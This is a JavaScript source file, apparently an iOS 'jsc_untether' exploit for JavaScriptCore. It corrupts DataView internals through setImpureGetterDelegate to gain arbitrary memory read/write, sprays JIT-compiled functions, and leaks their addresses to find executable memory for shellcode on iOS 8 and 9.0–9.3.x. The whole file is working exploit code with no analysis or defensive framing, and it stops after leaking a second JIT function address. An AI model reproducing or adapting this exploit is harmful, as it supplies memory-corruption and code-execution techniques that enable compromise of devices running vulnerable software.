const DV_ARRAYBUFFER_OFFSET = 0x10;
const DV_BYTELENGTH_OFFSET = DV_ARRAYBUFFER_OFFSET + 4;
const DV_MODE_OFFSET = DV_BYTELENGTH_OFFSET + 4;
const FAST_TYPED_ARRAY_MODE = 0;

var Memory = function() {
    this.read32 = function(addr) { return dv_rw.getUint32(addr, true); }
    this.write32 = function(addr, data) { dv_rw.setUint32(addr, data, true); }
}

var Utils = function() {
    this.print = function(msg) { debug(msg) }; 
    this.hex32 = function(num) {
        num = num >>> 0;
        var hex_str = num.toString(16);
        while (hex_str.length < 8) {
            hex_str = '0' + hex_str;
        }
        return '0x' + hex_str;
    }

    this.quit_jsc = function() {
        try {
            quit();
        } catch(err) {
            var quit = JSC_HAXX;
        }
    }

    this.get_cpu_arch = function() {
        var output = describe(debug);
        var addr = output.match(/0x[0-9a-fA-F]+/);
    
        if (addr != 0) {
            var addr_len = addr[0].length - 2;
            if (addr_len >= 8) return "arm64";
            return "armv7";
        }
        return "unknown";
    }

    this.get_ios_version = function() {
        try {
            gcHeapSize(); // only exist on ios 9+
            return 9
        } catch(err) {
            return 8;
        }
    }
}

var util = new Utils();
var mem = new Memory();

var rw_buf = new ArrayBuffer(0x20);
var dv_init = new DataView(rw_buf);
var dv_rw = new DataView(rw_buf);
setImpureGetterDelegate(dv_init, dv_rw);

dv_init.setUint32(DV_ARRAYBUFFER_OFFSET, 0, true);
dv_init.setUint32(DV_BYTELENGTH_OFFSET, 0xffffffff, true);
dv_init.setUint32(DV_MODE_OFFSET, 0, true);

var rw_buf = new ArrayBuffer(0x20);
var dv_leak_addr = new DataView(rw_buf);
var dv_leak = new DataView(rw_buf);
setImpureGetterDelegate(dv_leak, dv_leak_addr);

var body = '';
for (var i = 0; i < 0x100; i++){
    body += 'try {} catch(e){};';
}

var jit_func1 = new Function('a', body);
for (var i = 0; i< 0x10000; i++){
    jit_func1();
}

var cpu_arch = util.get_cpu_arch();
var ios_version = util.get_ios_version();

util.print("[*] jsc_untether [*]");
util.print("cpu arch: " + cpu_arch);
util.print("ios version: " + ios_version);

setImpureGetterDelegate(dv_leak_addr, jit_func1);
jit_addr1 = dv_leak.getUint32(DV_ARRAYBUFFER_OFFSET, true);
util.print("jit_addr1: " + util.hex32(jit_addr1));
var shellcode = 0;

if (ios_version >= 9) {
    var shellcode_ptr = mem.read32(mem.read32(mem.read32(jit_addr1))+0x38);
    if (shellcode_ptr >= 0xfffff) {
        shellcode = mem.read32(shellcode_ptr+0xfc); // ios 9.0-9.2.1
        if (shellcode < 0xfffffff) shellcode = mem.read32(shellcode_ptr+0xcc); // ios 9.3-9.3.1
    }

    // ios 9.3.2+
    if (shellcode < 0xfffffff) {
        var shellcode_ptr = mem.read32(jit_addr1+0x14);
        shellcode = (mem.read32(shellcode_ptr+0x18)&0xfffff000)+0x80000;
    }

    util.print("shellcode_ptr: " + util.hex32(shellcode_ptr));
    util.print("shellcode: " + util.hex32(shellcode));
} else {
    var shellcode_ptr = mem.read32(jit_addr1+0x14);
    util.print("shellcode_ptr: " + util.hex32(shellcode_ptr));
    shellcode = (mem.read32(shellcode_ptr+0x20)&0xfffff000)+0x80000;
    util.print("shellcode: " + util.hex32(shellcode));
}

var body = '';
for (var i = 0; i < 0x100; i++) {
    body += 'try {} catch(e){};';
}

var jit_func2 = new Function('a', body);
for (var i = 0; i< 0x10000; i++) {
    jit_func2();
}

setImpureGetterDelegate(dv_leak_addr, jit_func2);
jit_addr2 = dv_leak.getUint32(DV_ARRAYBUFFER_OFFSET, true);
util.print("jit_addr2: " + util.hex32(jit_addr2));
